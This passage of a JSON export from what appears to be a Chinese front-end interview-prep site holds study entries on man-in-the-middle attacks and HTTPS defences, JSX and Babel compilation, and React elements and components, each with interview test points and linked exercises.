实现字体在小屏幕和大屏幕之间的平滑过渡？\n\n### 15. **Viewport 单位在 iOS 和 Android 下的差异**\n   - **iOS Safari 的特殊行为**：如何避免 iOS 下 `vh` 单位在滚动时的抖动问题？\n   - **设备宽度误差**：如何处理不同 Android 设备下视口宽度的误差？\n",
    "exerciseKeyList": "[]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 24,
    "createAt": "2024-11-09T11:00:36.000Z",
    "updateAt": "2024-11-10T05:42:12.000Z",
    "$progressExercise": "",
    "$exerciseList": []
  },
  "168": {
    "id": 168,
    "tagId": 21,
    "title": "中间人攻击",
    "explanation": "一句话总结：中间人攻击的关键在于**获取公钥**。\n\n## 一、我和小美传纸条\n\n我和隔壁班的小美互相喜欢，经常互相传纸条。但我懒得动，一般让老王帮我顺路带过去，我信任老王，所以就是简单把纸对折一下就交给老王了。\n\n![image.png](https://static.ecool.fun//article/1dea0b3b-4ac8-4cb6-a3d2-fe8415ed3cd8.)\n\n## 二、带锁的盒子\n\n有一天我发现，老王居然偷看我的纸条！\n\n我很生气，于是买了一个带锁的盒子，并配了两把钥匙🔑，我留一把，另一把让老王交给小美。我心想这下子老王没钥匙，看不了我们的纸条了。\n\n![image.png](https://static.ecool.fun//article/235f0840-93e4-4f77-9ef4-4809cdf7603a.)\n\n## 三、一个需要两把钥匙的盒子\n\n又过了几天，我发现老王还是会偷看，为什么呢？原来这老小子当初传递钥匙的时候，自己去复刻了一把！\n\n于是我又想了一个办法，换了一个更高级的盒子，这个盒子必须用一对钥匙才能使用，使用公钥上锁，必须使用私钥才能打开。我委托老王把我的公钥交给小美，把小美的公钥拿给我。\n\n以后我们都用对方的公钥来进行加密，对方用自己的私钥就能解密。而且就算老王把公钥拿去复刻一把也没关系，没有私钥他就打不开箱子，完美！\n\n![image.png](https://static.ecool.fun//article/411e7121-fcb0-4a6c-8e84-15c0b5825891.)\n\n## 四、班主任\n\n过了几天，我发现老王还是能偷看我们的纸条，为什么呢？？？？？？\n\n我想了好几天终于想明白了！原来老王当初传递钥匙的时候，他把我俩的公钥自己留下了，这老小子把自己的公钥给了我们俩。他现在有手里有四把钥匙，想看什么看什么！\n\n![image.png](https://static.ecool.fun//article/496f2870-b488-4d11-aaf9-1126dfebcd2b.)\n\n这次我们终于意识到问题的关键，不管什么方案，让老王传钥匙就得坏事！于是我和小美商量好，这次不通过老王，而是通过我的班主任传递公钥，终于可以愉快的聊天了！\n\n## 五、网络中的加密知识\n\n1.  对称加密\n\n对称加密使用`同一个密钥`进行加密和解密。它的优点是速度快，它的问题是密钥传播过程中一旦泄露，就功亏一篑了。\n\n2.  非对称加密\n\n非对称加密使用一对密钥：公钥和私钥。`公钥用于加密，私钥用于解密`。它的优点是密钥分发问题得到解决，公钥可以公开传播。缺点是速度较慢，通常用于加密小数据量或密钥交换。常见做法是通过非对称加密建立链接，交换对称加密密钥，然后使用对称加密的方式进行消息传递。\n\n3.  证书\n\n数字证书是由认证机构（CA）签发的，包含公钥及其持有者身份信息的电子文档。它通过 CA 的数字签名验证其真实性，确保通信双方的身份和公钥的可信性。（证书就是上面例子中的班主任，是一个可信任的获取对方公钥的机构。）\n\n## 六、中间人攻击\n\n中间人攻击的关键在于攻击者成功获取并提供**可信公钥**，欺骗用户使其认为其公钥是合法服务器的公钥。这可以通过伪造证书或利用受损的 CA 来实现。（用上面例子来说，就是老王把自己的公钥伪装成小美的公钥给了我）\n\n作为普通用户防御措施很简单，当访问一个网站时，如果浏览器弹出“证书不可信”告警的时候，不要点“我信任”。",
    "testPoint": "### **1. 中间人攻击的基本概念**\n#### **问题**：\n- 什么是中间人攻击？请用通俗的语言解释。\n- 中间人攻击有哪些典型的攻击方式？\n  - 被动攻击（如窃听）。\n  - 主动攻击（如数据篡改）。\n- 中间人攻击的危害有哪些？\n\n**关键点**：\n- 中间人攻击是一种攻击者拦截并篡改通信内容的攻击。\n- 危害包括：窃取敏感数据（如密码）、篡改通信内容、伪装身份等。\n\n---\n\n### **2. 中间人攻击的原理**\n#### **问题**：\n- 中间人攻击是如何实现的？请简要描述其工作流程。\n- 在 HTTP 中，为什么容易发生中间人攻击？\n- HTTPS 是否完全能防止中间人攻击？为什么？\n- DNS 劫持和 ARP 欺骗是如何帮助实现中间人攻击的？\n\n**关键点**：\n- **工作流程**：\n  1. 攻击者充当通信双方之间的“中间人”。\n  2. 拦截通信数据，可能进行监听或篡改。\n- **常见技术**：\n  - ARP 欺骗：伪装网关。\n  - DNS 劫持：将域名解析到攻击者控制的服务器。\n  - Wi-Fi 劫持：在公共网络中拦截通信数据。\n\n---\n\n### **3. 防御中间人攻击的技术措施**\n#### **问题**：\n- HTTPS 如何防御中间人攻击？它的安全机制是什么？\n- 什么是证书信任链？如何防止伪造的证书？\n- 什么是 HSTS（HTTP Strict Transport Security）？它如何防御中间人攻击？\n- 什么是双向 SSL/TLS？它如何进一步提高安全性？\n- 如何防止公共 Wi-Fi 中的中间人攻击？\n\n**关键点**：\n- **HTTPS**：\n  - 使用非对称加密验证身份，防止伪装。\n  - 数据传输使用对称加密，保证保密性。\n- **HSTS**：\n  - 强制使用 HTTPS，防止降级攻击。\n- **证书验证**：\n  - 客户端验证服务器证书的合法性，防止伪造。\n  - 遵循信任链。\n\n---\n\n### **4. 中间人攻击的常见场景**\n#### **问题**：\n- 在以下场景中，中间人攻击可能如何发生？如何防御？\n  1. 用户登录公共 Wi-Fi 时访问银行账户。\n  2. 一个应用程序使用第三方 API 时未启用 HTTPS。\n  3. 企业内网中存在不安全的设备。\n- 如何验证当前网络是否安全，是否存在中间人攻击？\n\n**关键点**：\n- 在公共 Wi-Fi 中，可以使用 VPN 来加密通信。\n- API 通信必须启用 HTTPS 并验证证书。\n- 使用安全工具检测不安全的代理或劫持。\n\n---\n\n### **5. HTTPS 与中间人攻击**\n#### **问题**：\n- HTTPS 如何阻止中间人攻击？\n- 如果攻击者能拦截 HTTPS 握手，是否可以实施中间人攻击？为什么？\n- 什么是降级攻击（Downgrade Attack）？如何通过 HTTPS 防止？\n\n**关键点**：\n- **HTTPS 机制**：\n  - 握手过程使用非对称加密防止伪装。\n  - 会话中使用对称加密保证数据安全。\n- **降级攻击**：\n  - 攻击者强迫客户端和服务器使用较弱的加密协议。\n  - TLS 1.3 移除了对不安全算法的支持，可以有效防御。\n\n---\n\n### **6. 中间人攻击的检测与排查**\n#### **问题**：\n- 如何检测网络中是否存在中间人攻击？\n- 如果某用户反映访问 HTTPS 页面时出现证书错误，可能是什么原因？如何排查？\n- 如果发现网络通信被篡改，应采取哪些紧急措施？\n\n**关键点**：\n- 使用浏览器检查 HTTPS 证书的有效性。\n- 使用工具（如 Wireshark）监控网络通信。\n- 遇到证书错误，检查证书是否被伪造或篡改。\n\n---\n\n### **7. 中间人攻击的场景化问题**\n#### **问题**：\n- 在实际项目中，你如何确保用户访问你的站点时不会遭受中间人攻击？\n- 如果第三方服务不支持 HTTPS，而你的系统必须与它通信，如何处理？\n- 如果你的网站需要支持旧设备（如不支持现代加密协议的浏览器），如何权衡安全性与兼容性？\n\n**关键点**：\n- 配置 HTTPS 并强制启用 HSTS。\n- 使用可信代理或中间服务为不支持 HTTPS 的第三方服务提供安全通信。\n",
    "exerciseKeyList": "[\"76826682-df0e-4dad-a50f-d500a09065cb\",\"825e3009-688d-43d4-ba62-0c4940d90ce9\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-04T01:27:48.000Z",
    "updateAt": "2024-12-04T01:27:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "76826682-df0e-4dad-a50f-d500a09065cb",
        "title": "https是如何保证安全的，又是如何保证不被中间人攻击的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-24T01:26:03.000Z",
        "updateAt": "2024-08-10T17:07:22.000Z"
      },
      {
        "exerciseKey": "825e3009-688d-43d4-ba62-0c4940d90ce9",
        "title": "中间人攻击是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:01:09.000Z",
        "updateAt": "2024-08-14T23:35:02.000Z"
      }
    ]
  },
  "170": {
    "id": 170,
    "tagId": 13,
    "title": "JSX",
    "explanation": "时下虽然接入 `JSX` 语法的框架越来越多，但与之缘分最深的毫无疑问仍然是 `React`。\n\n2013 年，当 `React` 带着 `JSX` 横空出世时，社区曾对 `JSX` 有过不少的争议，但如今，越来越多的人面对 `JSX` 都要说上一句“真香”！我们就来一起认识下这个“真香”的 `JSX`，聊一聊“`JSX` 代码是如何‘摇身一变’成为 `DOM` 的”。\n\n开始之前请先思考几个问题：\n\n1.  `JSX` 的本质是什么，它和 JS 之间到底是什么关系？\n2.  为什么要用 `JSX`？不用会有什么后果？\n3.  `JSX` 背后的功能模块是什么，这个功能模块都做了哪些事情？\n\n  面对以上问题，如果无法形成清晰且系统的思路，那么很可能是把 `JSX` 想得过于简单了。大多数人只是简单地把它理解为模板语法的一种，但事实上，`JSX` 作为 `React` 框架的一大特色，它与 `React` 本身的运作机制之间存在着千丝万缕的联系，上述 3 个问题的答案，就恰恰隐藏在这层“联系”中。\n\n## JSX 的本质：JavaScript 的语法扩展\n\n  JSX 到底是什么?看看 React 官网给出的一段定义：\n\n> `JSX` 是 `JavaScript` 的一种语法扩展，它和模板语言很接近，但是它充分具备 `JavaScript` 的能力。\n\n  “语法扩展”这一点在理解上几乎不会产生歧义，不过“它充分具备 `JavaScript` 的能力”这句，却总让人摸不着头脑，`JSX` 和 `JS` 怎么看也不像是“一路人”啊？这就引出了“`JSX` 语法是如何在 `JavaScript` 中生效的”这个问题。\n\n### JSX 语法是如何在 JavaScript 中生效的：认识 Babel\n\n  `Facebook` 公司给 `JSX` 的定位是 `JavaScript` 的“扩展”，而非 `JavaScript` 的“某个版本”，这就直接决定了浏览器并不会像天然支持 `JavaScript` 一样地支持 `JSX`。那么，`JSX` 的语法是如何在 `JavaScript` 中生效的呢？`React` 官网其实早已给过我们线索：\n\n> `JSX` 会被编译为 `React.createElement()`， `React.createElement()` 将返回一个叫作“`React Element`”的 `JS` 对象。\n\n  这里提到，`JSX` 在被编译后，会变成一个针对 `React.createElement` 的调用，此时你大可不必急于关注 `React.createElement` 这个 `API` 到底做了什么。咱们先来说说这个“编译”是怎么回事：“编译”这个动作，是由 `Babel` 来完成的。\n\n### 什么是 Babel 呢？\n\n> Babel 是一个工具链，主要用于将 `ECMAScript 2015+` 版本的代码转换为向后兼容的 `JavaScript` 语法，以便能够运行在当前和旧版本的浏览器或其他环境中。 —— Babel 官网\n\n  比如说，`ES2015+` 版本推出了一种名为“模板字符串”的新语法，这种语法在一些低版本的浏览器里并不兼容。下面是一段模板字符串的示例代码：\n\n```js\nconst name = \"Guy Fieri\";\nconst place = \"Flavortown\";\n`Hello ${name}, ready for ${place}?`;\n```\n\n  `Babel` 就可以帮我们把这段代码转换为大部分低版本浏览器也能够识别的 `ES5` 代码：\n\n```js\nconst name = \"Guy Fieri\";\nconst place = \"Flavortown\";\n\"Hello \".concat(name, \", ready for \").concat(place, \"?\");\n```\n\n  类似的，**Babel 也具备将 `JSX` 语法转换为 `JavaScript` 代码的能力**。\n\n  那么 `Babel` 具体会将 `JSX` 处理成什么样子呢？我们不如直接打开 `Babel` 的 `playground` 来看一看。代码如下：\n\n```js\n<div className=\"App\">\n\t<h1 className=\"title\">I am the title</h1>\n\t<p className=\"content\">I am the content</p>\n</div>\n```\n\n处理后：\n\n```js\n\"use strict\";\n\n/*#__PURE__*/\nReact.createElement(\"div\", {\n  className: \"App\"\n}, /*#__PURE__*/React.createElement(\"h1\", {\n  className: \"title\"\n}, \"I am the title\"), /*#__PURE__*/React.createElement(\"p\", {\n  className: \"content\"\n}, \"I am the content\"));\n```\n\n![在这里插入图片描述](https://static.ecool.fun//article/b0c0dabc-8d44-4a43-866d-aa2b20ef6d45.awebp)\n\n  所有的 `JSX` 标签都被转化成了 `React.createElement` 调用，这也就意味着，我们写的 `JSX` 其实写的就是 `React.createElement`，虽然它看起来有点像 `HTML`，但也只是“看起来像”而已。**JSX 的本质是**`React.createElement`**这个 JavaScript 调用的语法糖**，这也就完美地呼应上了 `React` 官方给出的“**JSX 充分具备 JavaScript 的能力**”这句话。\n\n## React 选用 JSX 语法的动机\n\n  换个角度想想，既然 `JSX` 等价于一次 `React.createElement` 调用，那么 `React` 官方为什么不直接引导我们用 `React.createElement` 来创建元素呢？\n\n  原因非常简单，我们来看一个相对复杂一些的组件的 `JSX` 代码和 `React.createElement` 调用之间的对比。它们各自的形态如下图所示，图中左侧是 `JSX` 代码，右侧是 `React.createElement` 调用：\n\n![在这里插入图片描述](https://static.ecool.fun//article/05f66996-552e-431e-8e7c-e1ac07bc02c2.awebp)\n\n  在实际功能效果一致的前提下，`JSX` 代码层次分明、嵌套关系清晰；而 `React.createElement` 代码则给人一种非常混乱的“杂糅感”，这样的代码不仅读起来不友好，写起来也费劲。\n\n**JSX 语法糖允许前端开发者使用我们最为熟悉的类 HTML 标签语法来创建虚拟 DOM，在降低学习成本的同时，也提升了研发效率与研发体验。**\n\n## JSX 是如何映射为 DOM 的：起底 createElement 源码\n\n  在开始之前，可以先尝试阅读追加进源码中的逐行代码解析，大致理解 createElement 中每一行代码的作用：\n\n```js\nexport const createElement = (type, config, children) => {\n  // propName 变量用于储存后面需要用到的元素属性\n  let propName;\n  // props 变量用于储存元素属性的键值对集合\n  const props = {};\n  // key、ref、self、source 均为 React 元素的属性，此处不必深究\n  let key = null;\n  let ref = null;\n  let self = null;\n  let source = null;\n\n  // config 对象中存储的是元素的属性\n  if (config != null) {\n    // 进来之后做的第一件事，是依次对 ref、key、self 和 source 属性赋值\n    if (hasValidRef(config)) {\n      ref = config.ref;\n    }\n    // 此处将 key 值字符串化\n    if (hasValidKey(config)) {\n      key = \"\" + config.key;\n    }\n    self = config.__self === undefined ? null : config.__self;\n    source = config.__source === undefined ? null : config.__source;\n    // 接着就是要把 config 里面的属性都一个一个挪到 props 这个之前声明好的对象里面\n    for (propName in config) {\n      if (\n        // 筛选出可以提进 props 对象里的属性\n        hasOwnProperty.call(config, propName) &&\n        !RESERVED_PROPS.hasOwnProperty(propName)\n      ) {\n        props[propName] = config[propName];\n      }\n    }\n    // childrenLength 指的是当前元素的子元素的个数，减去的 2 是 type 和 config 两个参数占用的长度\n    const childrenLength = arguments.length - 2;\n    // 如果抛去type和config，就只剩下一个参数，一般意味着文本节点出现了\n    if (childrenLength === 1) {\n      // 直接把这个参数的值赋给props.children\n      props.children = children;\n    } else if (childrenLength > 1) {\n      // 声明一个子元素数组\n      const childArray = Array(childrenLength);\n      // 把子元素推进数组里\n      for (let i = 0; i < childrenLength; i++) {\n        childArray[i] = arguments[i + 2];\n      }\n      // 最后把这个数组赋值给props.children\n      props.children = childArray;\n    }\n    // 处理 defaultProps\n    if (type && type.defaultProps) {\n      const defaultProps = type.defaultProps;\n      for (propName in defaultProps) {\n        if (props[propName] === undefined) {\n          props[propName] = defaultProps[propName];\n        }\n      }\n    }\n    // 最后返回一个调用ReactElement执行方法，并传入刚才处理过的参数\n    return ReactElement(\n      type,\n      key,\n      ref,\n      self,\n      source,\n      ReactCurrentOwner.current,\n      props\n    );\n  }\n};\n```\n\n### 入参解读：创造一个元素需要知道哪些信息\n\n  先来看看方法的入参：\n\n> export function createElement(type, config, children)\n\n`createElement` 有 3 个入参，这 3 个入参囊括了 `React` 创建一个元素所需要知道的全部信息。\n\n+   `type`：用于标识节点的类型。它可以是类似“h1”“div”这样的标准 HTML 标签字符串，也可以是 React 组件类型或 `React fragment` 类型\n+   `config`：以对象形式传入，组件所有的属性都会以键值对的形式存储在 `config` 对象中\n+   `children`：以对象形式传入，它记录的是组件标签之间嵌套的内容，也就是所谓的“子节点”“子元素”\n\n  如果文字描述使你觉得抽象，下面这个调用示例可以帮你增进对概念的理解：\n\n```js\nReact.createElement(\"ul\", {\n  // 传入属性键值对\n  className: \"list\"\n   // 从第三个入参开始往后，传入的参数都是 children\n}, React.createElement(\"li\", {\n  key: \"1\"\n}, \"1\"), React.createElement(\"li\", {\n  key: \"2\"\n}, \"2\"));\n```\n\nDOM结构如下：\n\n```html\n<ul className=\"list\">\n    <li key=\"1\">1</li>\n    <li key=\"2\">2</li>\n</ul>\n```\n\n#### createElement 函数体拆解\n\n  前面已经阅读过 `createElement` 源码细化到每一行的解读，这里探讨的是 `createElement`**在逻辑层面的任务流转**。针对这个过程，总结了下面这张流程图：\n\n![在这里插入图片描述](https://static.ecool.fun//article/437d408a-7a27-4a7d-a92c-e7e26d671e7f.awebp)\n\n  `createElement` 中并没有十分复杂的涉及算法或真实 `DOM` 的逻辑，它的**每一个步骤几乎都是在格式化数据**。\n\n  说得更直白点，`createElement` 就像是开发者和 `ReactElement` 调用之间的一个“**转换器**”、一个**数据处理层**。它可以从开发者处接受相对简单的参数，然后将这些参数按照 `ReactElement` 的预期做一层格式化，最终通过调用 `ReactElement` 来实现元素的创建。整个过程如下图所示：\n\n![在这里插入图片描述](https://static.ecool.fun//article/e9903a01-2468-43b3-9350-d3a0c7bad5b3.awebp)\n\n现在看来，`createElement` 原来只是个“参数中介”。\n\n### 出参解读：初识虚拟 DOM\n\n  `createElement` 执行到最后会 `return` 一个针对 `ReactElement` 的调用。这里关于 `ReactElement`，先给出源码 + 注释形式的解析：\n\n```js\nconst ReactElement = function (type, key, ref, self, source, owner, props) {\n  const element = {\n    // REACT_ELEMENT_TYPE是一个常量，用来标识该对象是一个ReactElement\n    $$typeof: REACT_ELEMENT_TYPE,\n\n    // 内置属性赋值\n    type: type,\n    key: key,\n    ref: ref,\n    props: props,\n    // 记录创造该元素的组件\n    _owner: owner,\n  };\n  //\n  if (__DEV__) {\n    // 这里是一些针对 __DEV__ 环境下的处理，对于大家理解主要逻辑意义不大，此处我直接省略掉，以免混淆视听\n  }\n  return element;\n};\n```\n\n  从逻辑上我们可以看出，`ReactElement` 其实只做了一件事情，那就是“**创建**”，说得更精确一点，是“**组装**”：`ReactElement` 把传入的参数按照一定的规范，“组装”进了 `element` 对象里，并把它返回给了 `React.createElement`，最终 `React.createElement` 又把它交回到了开发者手中。整个过程如下图所示：\n\n![在这里插入图片描述](https://static.ecool.fun//article/59bcf467-fab5-4eb5-8543-6e976ebaa4fc.awebp)\n\n如果想要验证这一点，可以尝试输出示例中 `App` 组件的 `JSX` 部分：\n\n```js\nconst AppJSX = (<div className=\"App\">\n  <h1 className=\"title\">I am the title</h1>\n  <p className=\"content\">I am the content</p>\n</div>)\nconsole.log(AppJSX)\n```\n\n  你会发现它确实是一个标准的 `ReactElement` 对象实例，如下图（生产环境下的输出结果）所示：你会发现它确实是一个标准的 `ReactElement` 对象实例，如下图（生产环境下的输出结果）所示：\n\n![在这里插入图片描述](https://static.ecool.fun//article/13861047-b435-4e6a-9b6e-4f66b7a5308f.awebp)\n\n  这个 `ReactElement` 对象实例，本质上是**以 `JavaScript` 对象形式存在的对 `DOM` 的描述**，也就是老生常谈的“虚拟 `DOM`”（**准确地说，是虚拟 `DOM` 中的一个节点**)。\n\n  既然是“虚拟 DOM”，那就意味着和渲染到页面上的真实 DOM 之间还有一些距离，这个“距离”，就是由大家喜闻乐见的**ReactDOM.render**方法来填补的。\n\n  在每一个 `React` 项目的入口文件中，都少不了对 `React.render` 函数的调用。下面我简单介绍下 `ReactDOM.render` 方法的入参规则：\n\n```js\nReactDOM.render(\n    // 需要渲染的元素（ReactElement）\n    element, \n    // 元素挂载的目标容器（一个真实DOM）\n    container,\n    // 回调函数，可选参数，可以用来处理渲染结束后的逻辑\n    [callback]\n)\n```\n\n  `ReactDOM.render` 方法可以接收 3 个参数，其中**第二个参数就是一个真实的 DOM 节点**，**这个真实的 DOM 节点充当“容器”的角色**，`React` 元素最终会被渲染到这个“容器”里面去。比如，示例中的 `App` 组件，它对应的 `render` 调用是这样的：\n\n```js\nconst rootElement = document.getElementById(\"root\");\nReactDOM.render(<App />, rootElement);\n```\n\n  注意，这个真实 `DOM` 一定是确实存在的。比如，在 `App` 组件对应的 `index.html` 中，已经提前预置 了 `id` 为 `root` 的根节点：\n\n## 总结\n\n1.  `JSX` 是 `JavaScript` 的一种语法扩展，它和模板语言很接近，但是它充分具备 `JavaScript` 的能力。**JSX 的本质是**`React.createElement`**这个 JavaScript 调用的语法糖**\n    \n2.  `JSX` 语法糖允许前端开发者使用我们最为熟悉的类 `HTML` 标签语法来创建虚拟 `DOM`，在降低学习成本的同时，也提升了研发效率与研发体验。\n    \n3.  `JSX`被`React.createElement`转化为`ReactElement` ,`React.render`将`ReactElement`虚拟节点变成真实节点挂载在HTML上；",
    "testPoint": "### **1. JSX 的基本概念**\n- **JSX 是什么？**  \n  JSX 是一种 JavaScript 语法扩展，用于在 JavaScript 代码中嵌入类似 HTML 的结构。它最终会被转译成 React.createElement 调用，生成虚拟 DOM。\n\n  - **考察点**：候选人是否理解 JSX 只是语法糖，底层是 React.createElement。\n  - **示例问题**：JSX 是什么？它和 HTML 有什么不同？\n\n### **2. JSX 语法**\n- **嵌套和标签闭合**：JSX 中所有标签必须闭合，包括自闭合标签。\n  - **考察点**：候选人是否知道在 JSX 中，所有标签必须闭合，不能像 HTML 一样省略闭合标签。\n  - **示例问题**：JSX 中标签必须闭合的原因是什么？`<img>` 标签需要如何书写？\n\n- **属性传递**：在 JSX 中，属性的书写与 HTML 类似，但需要使用驼峰命名（例如：`className`、`htmlFor`）。\n  - **考察点**：候选人是否了解 JSX 中如何使用 DOM 属性以及 React 特有的属性（如 `className`、`htmlFor`）。\n  - **示例问题**：在 JSX 中如何传递 class、for 属性？为什么不能使用 `class` 和 `for`？\n\n- **表达式嵌入**：JSX 中可以嵌入 JavaScript 表达式，表达式需要放在 `{}` 中。\n  - **考察点**：候选人是否知道如何在 JSX 中插入 JavaScript 表达式以及如何处理表达式的返回值。\n  - **示例问题**：在 JSX 中嵌入 JavaScript 表达式时如何书写？举个例子说明。\n\n### **3. JSX 和 JavaScript 的结合**\n- **JavaScript 表达式的返回值**：JSX 只能包含有效的 JavaScript 表达式，不能包含语句。\n  - **考察点**：候选人是否知道 JSX 只能放置返回值的表达式，不能直接放置像 `if` 或 `for` 这样的语句。\n  - **示例问题**：在 JSX 中能写 `if` 和 `for` 语句吗？为什么不能？\n\n- **条件渲染**：使用条件语句（如三元运算符）在 JSX 中实现条件渲染。\n  - **考察点**：候选人是否知道如何在 JSX 中实现条件渲染，常用的技术是三元运算符。\n  - **示例问题**：如何在 JSX 中根据条件渲染不同的内容？你可以给出一个三元运算符的示例吗？\n\n- **循环渲染**：通过 `map` 函数渲染列表，生成一组 JSX 元素。\n  - **考察点**：候选人是否了解如何通过 `map` 函数遍历数组，并返回一组 JSX 元素。\n  - **示例问题**：如何使用 `map` 在 JSX 中渲染一个列表？\n\n### **4. JSX 事件处理**\n- **事件处理机制**：JSX 中的事件处理与 DOM 事件类似，但有一些不同之处，尤其是事件名称的写法（如 `onClick`、`onChange`）。\n  - **考察点**：候选人是否了解 React 的事件系统，以及如何在 JSX 中处理事件。\n  - **示例问题**：如何在 JSX 中处理用户点击事件？如何给按钮绑定 `onClick` 事件？\n\n- **事件处理函数的绑定**：在类组件中，事件处理函数常常需要绑定 `this`，而在函数组件中，不需要绑定。\n  - **考察点**：候选人是否理解函数式组件与类组件事件绑定的区别。\n  - **示例问题**：在类组件中如何绑定事件处理函数的 `this`？\n\n### **5. JSX 中的类与样式**\n- **类名与样式**：在 JSX 中，`class` 被替换为 `className`，并且样式可以通过内联样式对象或类名的方式来应用。\n  - **考察点**：候选人是否了解在 JSX 中如何设置元素的类和样式。\n  - **示例问题**：在 JSX 中如何给元素添加 `class`？如何在 JSX 中设置内联样式？\n\n### **6. JSX 中的 key 属性**\n- **`key` 的使用**：在渲染列表时，React 需要 `key` 属性来标识每个元素，这样可以有效地更新虚拟 DOM。\n  - **考察点**：候选人是否理解为什么在渲染列表时需要 `key` 属性，并知道如何使用。\n  - **示例问题**：为什么在渲染列表时需要给每个元素添加 `key` 属性？如果没有添加 `key` 会怎样？\n\n### **7. JSX 中的 Fragment 和返回多个元素**\n- **Fragment**：JSX 不允许返回多个根元素，因此使用 `Fragment` 或 `div` 包裹多个元素。\n  - **考察点**：候选人是否知道如何返回多个元素，避免 JSX 只能返回一个根节点的问题。\n  - **示例问题**：如果需要在 JSX 中返回多个元素，如何处理？\n\n### **8. JSX 性能优化**\n- **JSX 性能考虑**：React 的虚拟 DOM 会通过 diff 算法优化更新，但不合理的 JSX 写法仍然可能影响性能。\n  - **考察点**：候选人是否能理解 JSX 可能导致的性能问题，并知道如何优化（例如避免不必要的 re-render、使用 `key` 属性优化列表渲染）。\n  - **示例问题**：如何优化大量元素渲染时的性能？\n\n### **9. JSX 与组件的结合**\n- **组件中使用 JSX**：在组件中，JSX 作为组件的返回值，在组件内部需要返回 JSX 元素来渲染。\n  - **考察点**：候选人是否能理解 JSX 在组件中的应用，以及如何正确地使用 JSX 返回渲染内容。\n  - **示例问题**：在 React 组件中，如何使用 JSX 返回多个元素？\n\n### **10. JSX 转换和编译**\n- **JSX 转换**：JSX 需要通过 Babel 或其他编译工具转译成 JavaScript 代码，最终生成 `React.createElement` 调用。\n  - **考察点**：候选人是否了解 JSX 的编译过程，以及它如何转译成 React.createElement。\n  - **示例问题**：React 中的 JSX 是如何转换成 JavaScript 代码的？\n",
    "exerciseKeyList": "[\"6eec7f26-3bdc-4015-86fc-a75d495311a6\",\"5bdf6ed5-2178-4bef-8690-c04dcdf46930\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T07:12:28.000Z",
    "updateAt": "2024-12-26T11:08:14.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "5bdf6ed5-2178-4bef-8690-c04dcdf46930",
        "title": "什么是JSX？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:47:14.000Z",
        "updateAt": "2024-08-10T17:04:56.000Z"
      },
      {
        "exerciseKey": "6eec7f26-3bdc-4015-86fc-a75d495311a6",
        "title": "说说React Jsx转换成真实DOM过程？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T04:20:00.000Z",
        "updateAt": "2024-08-10T17:05:51.000Z"
      }
    ]
  },
  "171": {
    "id": 171,
    "tagId": 13,
    "title": "元素、组件、实例和节点",
    "explanation": "React 中的元素、组件、实例和节点，是React中关系密切的4个概念，也是很容易让React 初学者迷惑的4个概念。现在，老干部就来详细地介绍这4个概念，以及它们之间的联系和区别，满足喜欢咬文嚼字、刨根问底的同学（老干部就是其中一员）的好奇心。\n\n#### 元素 (Element)\n\n**React 元素其实就是一个简单JavaScript对象，一个React 元素和界面上的一部分DOM对应，描述了这部分DOM的结构及渲染效果**。一般我们通过JSX语法创建React 元素，例如：\n\n```js\nconst element = <h1 className='greeting'>Hello, world</h1>;\n```\n\nelement是一个React 元素。在编译环节，JSX 语法会被编译成对React.createElement()的调用，从这个函数名上也可以看出，JSX语法返回的是一个React 元素。上面的例子编译后的结果为：\n\n```js\nconst element = React.createElement(\n  'h1',\n  {className: 'greeting'},\n  'Hello, world!'\n);\n```\n\n最终，element的值是类似下面的一个简单JavaScript对象：\n\n```js\nconst element = {\n  type: 'h1',\n  props: {\n    className: 'greeting',\n    children: 'Hello, world'\n  }\n}\n```\n\nReact 元素可以分为两类：DOM类型的元素和组件类型的元素。DOM类型的元素使用像h1、div、p等DOM节点创建React 元素，前面的例子就是一个DOM类型的元素；组件类型的元素使用React 组件创建React 元素，例如：\n\n```js\nconst buttonElement = <Button color='red'>OK</Button>;\n```\n\nbuttonElement就是一个组件类型的元素，它的值是：\n\n```js\nconst buttonElement = {\n  type: 'Button',\n  props: {\n    color: 'red',\n    children: 'OK'\n  }\n}\n```\n\n对于DOM类型的元素，因为和页面的DOM节点直接对应，所以React知道如何进行渲染。但是对于组件类型的元素，如buttonElement，React是无法直接知道应该把buttonElement渲染成哪种结构的页面DOM，这时就需要组件自身提供React能够识别的DOM节点信息，具体实现方式在介绍组件时会详细介绍。\n\n有了React 元素，我们应该如何使用它呢？其实，绝大多数情况下，我们都不会直接使用React 元素，React 内部会自动根据React 元素，渲染出最终的页面DOM。更确切地说，React元素描述的是React虚拟DOM的结构，React会根据虚拟DOM渲染出页面的真实DOM。\n\n#### 组件 (Component)\n\nReact 组件，应该是大家最熟悉的React中的概念。React通过组件的思想，将界面拆分成一个个可以复用的模块，每一个模块就是一个React 组件。一个React 应用由若干组件组合而成，一个复杂组件也可以由若干简单组件组合而成。\n\nReact组件和React元素关系密切，**React组件最核心的作用是返回React元素**。这里你也许会有疑问：React元素不应该是由React.createElement() 返回的吗？但React.createElement()的调用本身也是需要有“人”负责的，React组件正是这个“责任人”。React组件负责调用React.createElement()，返回React元素，供React内部将其渲染成最终的页面DOM。\n\n既然组件的核心作用是返回React元素，那么最简单的组件就是一个返回React元素的函数：\n\n```js\nfunction Welcome(props) {\n  return <h1>Hello, {props.name}</h1>;\n}\n```\n\nWelcome是一个用函数定义的组件。如果使用类（class）定义组件，返回React元素的工作具体就由组件的render方法承担，例如：\n\n```js\nclass Welcome extends React.Component {\n  render() {\n    return <h1>Hello, {this.props.name}</h1>;\n  }\n}\n```\n\n其实，使用类定义的组件，render方法是唯一必需的方法，其他组件的生命周期方法都只不过是为render服务而已，都不是必需的。\n\n现在来考虑下面这个例子：\n\n```js\nclass Home extends React.Component {\n  render() {\n    return (\n      <div>\n        <Welcome name='老干部' />\n        <p>Anything you like</p>\n      </div>\n    )\n  }\n}\n```\n\nHome 组件使用了Welcome组件，返回的React元素为：\n\n```js\n{\n  type: 'div',\n  props: {\n    children: [\n      {\n        type: 'Welcome',\n        